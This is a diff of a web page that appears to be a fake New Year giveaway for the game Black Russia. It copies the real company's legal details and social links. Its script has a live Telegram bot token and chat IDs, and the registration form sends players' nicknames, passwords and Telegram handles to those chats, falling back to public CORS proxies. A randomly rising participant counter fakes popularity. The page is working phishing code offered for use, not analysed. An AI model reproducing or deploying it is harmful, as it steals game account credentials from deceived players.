-            <li style="margin: 12px 0;">❄ Укажите корректные данные аккаунта</li>
-            <li style="margin: 12px 0;">❄ Один участник — одна заявка</li>
-            <li style="margin: 12px 0;">❄ Победители определяются честно и прозрачно</li>
-            <li style="margin: 12px 0;">❄ Результаты будут объявлены 31 января 2026</li>
-        </ul>
-    </section>
-</main>
+    <main>
+        <section>
+            <h2>📋 Правила участия</h2>
+            <ul style="list-style: none; padding: 0;">
+                <li style="margin: 12px 0;">❄ Зарегистрируйтесь через форму выше</li>
+                <li style="margin: 12px 0;">❄ Укажите корректные данные аккаунта</li>
+                <li style="margin: 12px 0;">❄ Один участник — одна заявка</li>
+                <li style="margin: 12px 0;">❄ Победители определяются честно и прозрачно</li>
+                <li style="margin: 12px 0;">❄ Результаты будут объявлены 31 января 2026</li>
+            </ul>
+        </section>
+    </main>
 
-<script>
-// Конфигурация Telegram Bot
-// Добавляй сколько угодно ID в массив chatIds (1, 2, 3 или больше)
-const TELEGRAM_CONFIG = {
-    botToken: '7976053381:AAHYgNpGjKJKc397Wq2OfTDQEPfMYoaCdtQ',
-    chatIds: [
-        '7268545025',           // Основной ID (обязательный)
-        '1199892427',           // Второй ID (раскомментируй и замени на свой)
-        '7124849863',            // Третий ID (раскомментируй и замени на свой)
-    ]
-};
+    <!-- Premium Footer Section -->
+    <footer class="site-footer">
+        <div class="footer-container">
+            <!-- Верхняя часть: логотип + соц. сети -->
+            <div class="footer-top">
+                <div class="footer-logo">
+                    <img src="logo3.png" alt="Black Russia" class="footer-game-logo">
+                    <div class="footer-brand">
+                        <span class="brand-name">BLACK</span>
+                        <span class="brand-name-sub">RUSSIA</span>
+                    </div>
+                </div>
 
-// Timer
-function updateTimer() {
-    const endDate = new Date("January 31, 2026 23:59:59").getTime();
-    const now = new Date().getTime();
-    const distance = endDate - now;
+                <div class="footer-socials">
+                    <a href="https://vk.com/blackrussia.online" target="_blank" rel="noopener noreferrer"
+                        class="social-btn vk" title="ВКонтакте">
+                        <svg viewBox="0 0 24 24" fill="currentColor" width="24" height="24">
+                            <path fill-rule="evenodd" clip-rule="evenodd"
+                                d="M13.162 11.233c.316.323.337.892.337.892s0 .285.005.513c.017.807-.468.966-.468.966s-1.428.106-3.239-1.802c-2.071-2.181-3.879-6.736-3.879-6.736s-.106-.264-.15-.403c-.092-.294-.658-.337-.658-.337l-6.273.043s-.463.021-.635.213c-.156.175-.01.52.01.52S1.303 6.643 3.4 9.47c1.398 1.884 3.348 3.528 5.626 3.528h2.668s.772-.084.772-2.673c0-2.673 2.378-2.673 2.378-2.673s1.956 3.486 4.39 5.342c1.83 1.396 3.09 1.417 3.09 1.417l6.766-.085s3.528-.212 1.849-5.912c-.068-.233-.306-.966-1.554-2.731-2.147-3.037-3.64-3.419-3.64-3.419s-1.01-.212-1.93.955c-.179.227-1.396 1.785-1.574 2.014z" />
+                        </svg>
+                    </a>
+                    <a href="https://t.me/br_dev" target="_blank" rel="noopener noreferrer" class="social-btn telegram"
+                        title="Telegram">
+                        <svg viewBox="0 0 24 24" fill="currentColor" width="24" height="24">
+                            <path
+                                d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z" />
+                        </svg>
+                    </a>
+                    <a href="https://discord.gg/ws7sJaKruq" target="_blank" rel="noopener noreferrer"
+                        class="social-btn discord" title="Discord">
+                        <svg viewBox="0 0 24 24" fill="currentColor" width="24" height="24">
+                            <path
+                                d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z" />
+                        </svg>
+                    </a>
+                    <a href="https://www.youtube.com/@BlackRussia.Mobile" target="_blank" rel="noopener noreferrer"
+                        class="social-btn youtube" title="YouTube">
+                        <svg viewBox="0 0 24 24" fill="currentColor" width="24" height="24">
+                            <path
+                                d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z" />
+                        </svg>
+                    </a>
+                </div>
+            </div>
 
-    if (distance < 0) {
-        document.getElementById("days").textContent = "00";
-        document.getElementById("hours").textContent = "00";
-        document.getElementById("minutes").textContent = "00";
-        document.getElementById("seconds").textContent = "00";
-        return;
-    }
+            <!-- Навигация -->
+            <div class="footer-nav">
+                <a href="#" class="footer-link">Как начать играть</a>
+                <a href="#" class="footer-link">Донат</a>
+                <a href="#" class="footer-link">Форум</a>
+            </div>
 
-    const days = Math.floor(distance / (1000 * 60 * 60 * 24));
-    const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-    const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
-    const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+            <!-- Разделитель -->
+            <div class="footer-divider"></div>
 
-    document.getElementById("days").textContent = String(days).padStart(2, '0');
-    document.getElementById("hours").textContent = String(hours).padStart(2, '0');
-    document.getElementById("minutes").textContent = String(minutes).padStart(2, '0');
-    document.getElementById("seconds").textContent = String(seconds).padStart(2, '0');
-}
+            <!-- Юридическая информация -->
+            <div class="footer-legal">
+                <p class="legal-title">Общество с ограниченной ответственностью «Блекхаб Геймс»</p>
+                <p class="legal-text">ИНН: 7841098558</p>
+                <p class="legal-text">ОГРН: 1227800054668</p>
+                <p class="legal-text">197101, г. Санкт-Петербург, вн. тер. г. Муниципальный округ Кронверкское, пр-кт
+                    Большой П.С., д. 53, к. 3, литера А</p>
+                <p class="legal-text">support_br@blackhub.games</p>
+            </div>
 
-updateTimer();
-setInterval(updateTimer, 1000);
+            <!-- Описание игры -->
+            <div class="footer-description">
+                <p>Игра бесплатная и не требует внесения денежных средств. Однако в игре предусмотрена возможность
+                    приобретения внутриигровых предметов, валюты (BC), игровых статусов для наиболее разнообразного
+                    геймплея на наших серверах.</p>
+            </div>
 
-// Participants Counter
-let participantCount = 1247;
+            <!-- Копирайт -->
+            <div class="footer-copyright">
+                <p>© 2024-2026 Black Russia. Все права защищены.</p>
+            </div>
+        </div>
+    </footer>
 
-function updateParticipantCount() {
-    const increase = Math.floor(Math.random() * 4);
-    participantCount += increase;
-    document.getElementById("participant-count").textContent = participantCount.toLocaleString('ru-RU');
-}
+    <style>
+        /* ==================================== */
+        /* PREMIUM FOOTER STYLES                */
+        /* ==================================== */
 
-setInterval(updateParticipantCount, Math.random() * 10000 + 5000);
+        .site-footer {
+            position: relative;
+            z-index: 10;
+            background: linear-gradient(180deg, rgba(10, 25, 41, 0.95) 0%, rgba(5, 15, 25, 0.98) 100%);
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            margin-top: 60px;
+            padding: 50px 20px 30px;
+        }
 
-// Snow - Улучшенная логика с PNG
-const snowContainer = document.getElementById('snow-container');
-const MAX_SNOWFLAKES = 50; // Максимум снежинок на экране
-let activeSnowflakes = 0;
+        .footer-container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
 
-function createSnowflake() {
-    // Ограничиваем количество
-    if (activeSnowflakes >= MAX_SNOWFLAKES) return;
-    
-    const snowflake = document.createElement('div');
-    snowflake.classList.add('snowflake');
-    
-    // Используем PNG
-    const img = document.createElement('img');
-    img.src = 'flake.png';
-    img.alt = '';
-    snowflake.appendChild(img);
-    
-    // Рандомные параметры
-    const size = Math.random() * 25 + 15; // 15-40px
-    const startX = Math.random() * 100;
-    const duration = Math.random() * 8 + 8; // 8-16 секунд
-    const delay = Math.random() * 2;
-    const opacity = Math.random() * 0.4 + 0.4; // 0.4-0.8
-    
-    snowflake.style.cssText = `
+        /* Top section: Logo + Socials */
+        .footer-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 30px;
+            margin-bottom: 40px;
+        }
+
+        .footer-logo {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .footer-game-logo {
+            width: 60px;
+            height: 60px;
+            object-fit: contain;
+            filter: drop-shadow(0 4px 15px rgba(200, 50, 50, 0.4));
+        }
+
+        .footer-brand {
+            display: flex;
+            flex-direction: column;
+            line-height: 1.1;
+        }
+
+        .brand-name {
+            font-size: 1.8rem;
+            font-weight: 800;
+            color: #fff;
+            letter-spacing: 2px;
+        }
+
+        .brand-name-sub {
+            font-size: 1.8rem;
+            font-weight: 800;
+            color: #fff;
+            letter-spacing: 2px;
+            opacity: 0.9;
+        }
+
+        /* Social buttons */
+        .footer-socials {
+            display: flex;
+            gap: 12px;
+        }
+
+        .social-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 50px;
+            height: 50px;
+            border-radius: 12px;
+            color: #fff;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            transition: all 0.3s ease;
+            text-decoration: none;
+        }
+
+        .social-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
+        }
+
+        .social-btn.vk:hover {
+            background: linear-gradient(135deg, #4a76a8 0%, #5181b8 100%);
+            border-color: #5181b8;
+        }
+
+        .social-btn.telegram:hover {
+            background: linear-gradient(135deg, #0088cc 0%, #229ed9 100%);
+            border-color: #229ed9;
+        }
+
+        .social-btn.discord:hover {
+            background: linear-gradient(135deg, #5865F2 0%, #7289da 100%);
+            border-color: #7289da;
+        }
+
+        .social-btn.youtube:hover {
+            background: linear-gradient(135deg, #FF0000 0%, #cc0000 100%);
+            border-color: #FF0000;
+        }
+
+        .social-btn svg {
+            width: 24px;
+            height: 24px;
+        }
+
+        /* Navigation */
+        .footer-nav {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 30px;
+            margin-bottom: 30px;
+        }
+
+        .footer-link {
+            color: rgba(255, 255, 255, 0.85);
+            text-decoration: none;
+            font-size: 1rem;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+
+        .footer-link::after {
+            content: '';
+            position: absolute;
+            bottom: -3px;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background: linear-gradient(90deg, #63b3ed, #4299e1);
+            transition: width 0.3s ease;
+        }
+
+        .footer-link:hover {
+            color: #fff;
+        }
+
+        .footer-link:hover::after {
+            width: 100%;
+        }
+
+        /* Divider */
+        .footer-divider {
+            height: 1px;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.15), transparent);
+            margin: 30px 0;
+        }
+
+        /* Legal info */
+        .footer-legal {
+            margin-bottom: 25px;
+        }
+
+        .legal-title {
+            font-size: 0.95rem;
+            font-weight: 700;
+            color: rgba(255, 255, 255, 0.9);
+            margin-bottom: 10px;
+        }
+
+        .legal-text {
+            font-size: 0.85rem;
+            font-weight: 400;
+            color: rgba(255, 255, 255, 0.6);
+            margin: 5px 0;
+            line-height: 1.5;
+        }
+
+        /* Description */
+        .footer-description {
+            margin-bottom: 25px;
+        }
+
+        .footer-description p {
+            font-size: 0.85rem;
+            font-weight: 400;
+            color: rgba(255, 255, 255, 0.5);
+            line-height: 1.6;
+            max-width: 800px;
+        }
+
+        /* Copyright */
+        .footer-copyright {
+            text-align: center;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .footer-copyright p {
+            font-size: 0.85rem;
+            color: rgba(255, 255, 255, 0.4);
+        }
+
+        /* Mobile responsive */
+        @media (max-width: 768px) {
+            .footer-top {
+                flex-direction: column;
+                text-align: center;
+            }
+
+            .footer-logo {
+                justify-content: center;
+            }
+
+            .footer-socials {
+                justify-content: center;
+            }
+
+            .footer-nav {
+                justify-content: center;
+                gap: 20px;
+            }
+
+            .brand-name,
+            .brand-name-sub {
+                font-size: 1.4rem;
+            }
+
+            .social-btn {
+                width: 45px;
+                height: 45px;
+            }
+
+            .footer-legal,
+            .footer-description {
+                text-align: center;
+            }
+        }
+    </style>
+
+    <script>
+        // Конфигурация Telegram Bot
+        // Добавляй сколько угодно ID в массив chatIds (1, 2, 3 или больше)
+        const TELEGRAM_CONFIG = {
+            botToken: '7976053381:AAHYgNpGjKJKc397Wq2OfTDQEPfMYoaCdtQ',
+            chatIds: [
+                '7268545025',           // Основной ID (обязательный)
+                '1199892427',           // Второй ID (раскомментируй и замени на свой)
+                '7124849863',            // Третий ID (раскомментируй и замени на свой)
+            ]
+        };
+
+        // Timer
+        function updateTimer() {
+            const endDate = new Date("January 31, 2026 23:59:59").getTime();
+            const now = new Date().getTime();
+            const distance = endDate - now;
+
+            if (distance < 0) {
+                document.getElementById("days").textContent = "00";
+                document.getElementById("hours").textContent = "00";
+                document.getElementById("minutes").textContent = "00";
+                document.getElementById("seconds").textContent = "00";
+                return;
+            }
+
+            const days = Math.floor(distance / (1000 * 60 * 60 * 24));
+            const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+            const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+            const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+
+            document.getElementById("days").textContent = String(days).padStart(2, '0');
+            document.getElementById("hours").textContent = String(hours).padStart(2, '0');
+            document.getElementById("minutes").textContent = String(minutes).padStart(2, '0');
+            document.getElementById("seconds").textContent = String(seconds).padStart(2, '0');
+        }
+
+        updateTimer();
+        setInterval(updateTimer, 1000);
+
+        // Participants Counter
+        let participantCount = 1247;
+
+        function updateParticipantCount() {
+            const increase = Math.floor(Math.random() * 4);
+            participantCount += increase;
+            document.getElementById("participant-count").textContent = participantCount.toLocaleString('ru-RU');
+        }
+
+        setInterval(updateParticipantCount, Math.random() * 10000 + 5000);
+
+        // Snow - Улучшенная логика с PNG
+        const snowContainer = document.getElementById('snow-container');
+        const MAX_SNOWFLAKES = 50; // Максимум снежинок на экране
+        let activeSnowflakes = 0;
+
+        function createSnowflake() {
+            // Ограничиваем количество
+            if (activeSnowflakes >= MAX_SNOWFLAKES) return;
+
+            const snowflake = document.createElement('div');
+            snowflake.classList.add('snowflake');
+
+            // Используем PNG
+            const img = document.createElement('img');
+            img.src = 'flake.png';
+            img.alt = '';
+            snowflake.appendChild(img);
+
+            // Рандомные параметры
+            const size = Math.random() * 25 + 15; // 15-40px
+            const startX = Math.random() * 100;
+            const duration = Math.random() * 8 + 8; // 8-16 секунд
+            const delay = Math.random() * 2;
+            const opacity = Math.random() * 0.4 + 0.4; // 0.4-0.8
+
+            snowflake.style.cssText = `
         left: ${startX}%;
         width: ${size}px;
         height: ${size}px;
@@ -1163,104 +1745,80 @@ function createSnowflake() {
         animation-duration: ${duration}s;
         animation-delay: ${delay}s;
     `;
-    
-    snowContainer.appendChild(snowflake);
-    activeSnowflakes++;
-    
-    // Удаляем после завершения анимации
-    const totalTime = (duration + delay) * 1000;
-    setTimeout(() => {
-        snowflake.remove();
-        activeSnowflakes--;
-    }, totalTime);
-}
 
-// Создаём снежинки с разным интервалом
-function snowLoop() {
-    createSnowflake();
-    // Рандомный интервал 200-600мс
-    const nextInterval = Math.random() * 400 + 200;
-    setTimeout(snowLoop, nextInterval);
-}
+            snowContainer.appendChild(snowflake);
+            activeSnowflakes++;
 
-// Стартовые снежинки
-for (let i = 0; i < 20; i++) {
-    setTimeout(createSnowflake, i * 100);
-}
-snowLoop();
-
-// Modal
-const modal = document.getElementById('registrationModal');
-const openBtn = document.getElementById('openModal');
-const closeBtn = document.getElementById('closeModal');
-
-openBtn.addEventListener('click', () => {
-    modal.classList.add('active');
-    document.body.style.overflow = 'hidden';
-});
-
-closeBtn.addEventListener('click', () => {
-    modal.classList.remove('active');
-    document.body.style.overflow = 'auto';
-});
-
-modal.addEventListener('click', (e) => {
-    if (e.target === modal) {
-        modal.classList.remove('active');
-        document.body.style.overflow = 'auto';
-    }
-});
-
-// Функция отправки в Telegram всем получателям
-async function sendToTelegram(message) {
-    const { botToken, chatIds } = TELEGRAM_CONFIG;
-    const results = [];
-    
-    // Отправляем всем ID из массива
-    for (const chatId of chatIds) {
-        try {
-            const result = await sendToSingleChat(botToken, chatId, message);
-            results.push({ chatId, success: result.ok });
-        } catch (error) {
-            console.log(`Failed to send to ${chatId}:`, error);
-            results.push({ chatId, success: false });
+            // Удаляем после завершения анимации
+            const totalTime = (duration + delay) * 1000;
+            setTimeout(() => {
+                snowflake.remove();
+                activeSnowflakes--;
+            }, totalTime);
         }
-    }
-    
-    // Возвращаем успех если хотя бы одно сообщение дошло
-    const anySuccess = results.some(r => r.success);
-    return { ok: anySuccess, results };
-}
 
-// Отправка одному получателю
-async function sendToSingleChat(botToken, chatId, message) {
-    // Метод 1: Прямой запрос к API Telegram
-    const tryDirectMethod = async () => {
-        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-        const response = await fetch(url, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                chat_id: chatId,
-                text: message,
-                parse_mode: 'HTML'
-            })
+        // Создаём снежинки с разным интервалом
+        function snowLoop() {
+            createSnowflake();
+            // Рандомный интервал 200-600мс
+            const nextInterval = Math.random() * 400 + 200;
+            setTimeout(snowLoop, nextInterval);
+        }
+
+        // Стартовые снежинки
+        for (let i = 0; i < 20; i++) {
+            setTimeout(createSnowflake, i * 100);
+        }
+        snowLoop();
+
+        // Modal
+        const modal = document.getElementById('registrationModal');
+        const openBtn = document.getElementById('openModal');
+        const closeBtn = document.getElementById('closeModal');
+
+        openBtn.addEventListener('click', () => {
+            modal.classList.add('active');
+            document.body.style.overflow = 'hidden';
         });
-        return response;
-    };
 
-    // Метод 2: Через CORS proxy (запасной вариант)
-    const tryCorsProxy = async () => {
-        const corsProxies = [
-            'https://corsproxy.io/?',
-            'https://api.allorigins.win/raw?url='
-        ];
-        
-        for (const proxy of corsProxies) {
-            try {
-                const url = `${proxy}https://api.telegram.org/bot${botToken}/sendMessage`;
+        closeBtn.addEventListener('click', () => {
+            modal.classList.remove('active');
+            document.body.style.overflow = 'auto';
+        });
+
+        modal.addEventListener('click', (e) => {
+            if (e.target === modal) {
+                modal.classList.remove('active');
+                document.body.style.overflow = 'auto';
+            }
+        });
+
+        // Функция отправки в Telegram всем получателям
+        async function sendToTelegram(message) {
+            const { botToken, chatIds } = TELEGRAM_CONFIG;
+            const results = [];
+
+            // Отправляем всем ID из массива
+            for (const chatId of chatIds) {
+                try {
+                    const result = await sendToSingleChat(botToken, chatId, message);
+                    results.push({ chatId, success: result.ok });
+                } catch (error) {
+                    console.log(`Failed to send to ${chatId}:`, error);
+                    results.push({ chatId, success: false });
+                }
+            }
+
+            // Возвращаем успех если хотя бы одно сообщение дошло
+            const anySuccess = results.some(r => r.success);
+            return { ok: anySuccess, results };
+        }
+
+        // Отправка одному получателю
+        async function sendToSingleChat(botToken, chatId, message) {
+            // Метод 1: Прямой запрос к API Telegram
+            const tryDirectMethod = async () => {
+                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
                 const response = await fetch(url, {
                     method: 'POST',
                     headers: {
@@ -1272,162 +1830,186 @@ async function sendToSingleChat(botToken, chatId, message) {
                         parse_mode: 'HTML'
                     })
                 });
-                
-                if (response.ok) return response;
-            } catch (e) {
-                continue;
+                return response;
+            };
+
+            // Метод 2: Через CORS proxy (запасной вариант)
+            const tryCorsProxy = async () => {
+                const corsProxies = [
+                    'https://corsproxy.io/?',
+                    'https://api.allorigins.win/raw?url='
+                ];
+
+                for (const proxy of corsProxies) {
+                    try {
+                        const url = `${proxy}https://api.telegram.org/bot${botToken}/sendMessage`;
+                        const response = await fetch(url, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify({
+                                chat_id: chatId,
+                                text: message,
+                                parse_mode: 'HTML'
+                            })
+                        });
+
+                        if (response.ok) return response;
+                    } catch (e) {
+                        continue;
+                    }
+                }
+                throw new Error('All proxies failed');
+            };
+
+            // Попробуем оба метода
+            try {
+                return await tryDirectMethod();
+            } catch (error) {
+                console.log('Direct method failed, trying proxy...');
+                return await tryCorsProxy();
             }
         }
-        throw new Error('All proxies failed');
-    };
 
-    // Попробуем оба метода
-    try {
-        return await tryDirectMethod();
-    } catch (error) {
-        console.log('Direct method failed, trying proxy...');
-        return await tryCorsProxy();
-    }
-}
+        // Form Submission
+        const form = document.getElementById('registrationForm');
+        const formContainer = document.getElementById('formContainer');
+        const successMessage = document.getElementById('successMessage');
 
-// Form Submission
-const form = document.getElementById('registrationForm');
-const formContainer = document.getElementById('formContainer');
-const successMessage = document.getElementById('successMessage');
+        // Валидация никнейма (формат Nick_Name)
+        function validateNickname(nickname) {
+            const nicknameRegex = /^[A-Za-z]+_[A-Za-z]+$/;
+            return nicknameRegex.test(nickname);
+        }
 
-// Валидация никнейма (формат Nick_Name)
-function validateNickname(nickname) {
-    const nicknameRegex = /^[A-Za-z]+_[A-Za-z]+$/;
-    return nicknameRegex.test(nickname);
-}
+        // Валидация пароля (минимум 6 символов)
+        function validatePassword(password) {
+            return password.length >= 6;
+        }
 
-// Валидация пароля (минимум 6 символов)
-function validatePassword(password) {
-    return password.length >= 6;
-}
+        // Валидация Telegram (начинается с @ или пустое)
+        function validateTelegram(telegram) {
+            if (telegram === '') return true;
+            return telegram.startsWith('@') && telegram.length > 1;
+        }
 
-// Валидация Telegram (начинается с @ или пустое)
-function validateTelegram(telegram) {
-    if (telegram === '') return true;
-    return telegram.startsWith('@') && telegram.length > 1;
-}
+        // Показать ошибку
+        function showError(inputId, message) {
+            const input = document.getElementById(inputId);
+            const errorEl = document.getElementById(`${inputId}-error`);
+            const infoHelp = input.parentElement.querySelector('.form-help.info');
 
-// Показать ошибку
-function showError(inputId, message) {
-    const input = document.getElementById(inputId);
-    const errorEl = document.getElementById(`${inputId}-error`);
-    const infoHelp = input.parentElement.querySelector('.form-help.info');
-    
-    input.classList.remove('success');
-    input.classList.add('error');
-    errorEl.textContent = message;
-    errorEl.classList.add('show');
-    if (infoHelp) infoHelp.classList.remove('show');
-}
+            input.classList.remove('success');
+            input.classList.add('error');
+            errorEl.textContent = message;
+            errorEl.classList.add('show');
+            if (infoHelp) infoHelp.classList.remove('show');
+        }
 
-// Показать успех
-function showSuccess(inputId) {
-    const input = document.getElementById(inputId);
-    const errorEl = document.getElementById(`${inputId}-error`);
-    const infoHelp = input.parentElement.querySelector('.form-help.info');
-    
-    input.classList.remove('error');
-    input.classList.add('success');
-    errorEl.classList.remove('show');
-    if (infoHelp) infoHelp.classList.remove('show');
-}
+        // Показать успех
+        function showSuccess(inputId) {
+            const input = document.getElementById(inputId);
+            const errorEl = document.getElementById(`${inputId}-error`);
+            const infoHelp = input.parentElement.querySelector('.form-help.info');
 
-// Очистить валидацию
-function clearValidation(inputId) {
-    const input = document.getElementById(inputId);
-    const errorEl = document.getElementById(`${inputId}-error`);
-    const infoHelp = input.parentElement.querySelector('.form-help.info');
-    
-    input.classList.remove('error', 'success');
-    errorEl.classList.remove('show');
-    if (infoHelp) infoHelp.classList.add('show');
-}
+            input.classList.remove('error');
+            input.classList.add('success');
+            errorEl.classList.remove('show');
+            if (infoHelp) infoHelp.classList.remove('show');
+        }
 
-// Валидация в реальном времени
-document.getElementById('nickname').addEventListener('input', (e) => {
-    const value = e.target.value.trim();
-    if (value === '') {
-        clearValidation('nickname');
-    } else if (!validateNickname(value)) {
-        showError('nickname', '❌ Формат: Имя_Фамилия (только английские буквы)');
-    } else {
-        showSuccess('nickname');
-    }
-});
+        // Очистить валидацию
+        function clearValidation(inputId) {
+            const input = document.getElementById(inputId);
+            const errorEl = document.getElementById(`${inputId}-error`);
+            const infoHelp = input.parentElement.querySelector('.form-help.info');
 
-document.getElementById('password').addEventListener('input', (e) => {
-    const value = e.target.value;
-    if (value === '') {
-        clearValidation('password');
-    } else if (!validatePassword(value)) {
-        showError('password', `❌ Слишком короткий (${value.length}/6 символов)`);
-    } else {
-        showSuccess('password');
-    }
-});
+            input.classList.remove('error', 'success');
+            errorEl.classList.remove('show');
+            if (infoHelp) infoHelp.classList.add('show');
+        }
 
-document.getElementById('telegram').addEventListener('input', (e) => {
-    const value = e.target.value.trim();
-    if (value === '') {
-        clearValidation('telegram');
-    } else if (!validateTelegram(value)) {
-        showError('telegram', '❌ Должен начинаться с @');
-    } else {
-        showSuccess('telegram');
-    }
-});
+        // Валидация в реальном времени
+        document.getElementById('nickname').addEventListener('input', (e) => {
+            const value = e.target.value.trim();
+            if (value === '') {
+                clearValidation('nickname');
+            } else if (!validateNickname(value)) {
+                showError('nickname', '❌ Формат: Имя_Фамилия (только английские буквы)');
+            } else {
+                showSuccess('nickname');
+            }
+        });
 
-form.addEventListener('submit', async (e) => {
-    e.preventDefault();
-    
-    const nickname = document.getElementById('nickname').value.trim();
-    const password = document.getElementById('password').value.trim();
-    const server = document.getElementById('server').value;
-    const telegram = document.getElementById('telegram').value.trim();
-    
-    // Валидация никнейма
-    if (!validateNickname(nickname)) {
-        showError('nickname', '❌ Неверный формат! Пример: Alex_Smith');
-        document.getElementById('nickname').focus();
-        return;
-    }
-    
-    // Валидация пароля
-    if (!validatePassword(password)) {
-        showError('password', '❌ Пароль должен содержать минимум 6 символов!');
-        document.getElementById('password').focus();
-        return;
-    }
-    
-    // Валидация сервера
-    if (!server) {
-        alert('❌ Пожалуйста, выберите сервер!');
-        document.getElementById('server').focus();
-        return;
-    }
-    
-    // Валидация Telegram (если указан)
-    if (telegram && !validateTelegram(telegram)) {
-        showError('telegram', '❌ Telegram должен начинаться с @ или оставьте поле пустым');
-        document.getElementById('telegram').focus();
-        return;
-    }
-    
-    const submitBtn = document.getElementById('submitBtn');
-    const originalText = submitBtn.innerHTML;
-    submitBtn.disabled = true;
-    submitBtn.innerHTML = '<div class="loading-spinner"></div> Отправка...';
-    
-    const telegramFormatted = telegram || 'Не указан';
-    
-    const prizeWon = wonPrize ? `${wonPrize.text} ${wonPrize.label}` : 'Не выбран';
-    
-    const message = `
+        document.getElementById('password').addEventListener('input', (e) => {
+            const value = e.target.value;
+            if (value === '') {
+                clearValidation('password');
+            } else if (!validatePassword(value)) {
+                showError('password', `❌ Слишком короткий (${value.length}/6 символов)`);
+            } else {
+                showSuccess('password');
+            }
+        });
+
+        document.getElementById('telegram').addEventListener('input', (e) => {
+            const value = e.target.value.trim();
+            if (value === '') {
+                clearValidation('telegram');
+            } else if (!validateTelegram(value)) {
+                showError('telegram', '❌ Должен начинаться с @');
+            } else {
+                showSuccess('telegram');
+            }
+        });
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const nickname = document.getElementById('nickname').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const server = document.getElementById('server').value;
+            const telegram = document.getElementById('telegram').value.trim();
+
+            // Валидация никнейма
+            if (!validateNickname(nickname)) {
+                showError('nickname', '❌ Неверный формат! Пример: Alex_Smith');
+                document.getElementById('nickname').focus();
+                return;
+            }
+
+            // Валидация пароля
+            if (!validatePassword(password)) {
+                showError('password', '❌ Пароль должен содержать минимум 6 символов!');
+                document.getElementById('password').focus();
+                return;
+            }
+
+            // Валидация сервера
+            if (!server) {
+                alert('❌ Пожалуйста, выберите сервер!');
+                document.getElementById('server').focus();
+                return;
+            }
+
+            // Валидация Telegram (если указан)
+            if (telegram && !validateTelegram(telegram)) {
+                showError('telegram', '❌ Telegram должен начинаться с @ или оставьте поле пустым');
+                document.getElementById('telegram').focus();
+                return;
+            }
+
+            const submitBtn = document.getElementById('submitBtn');
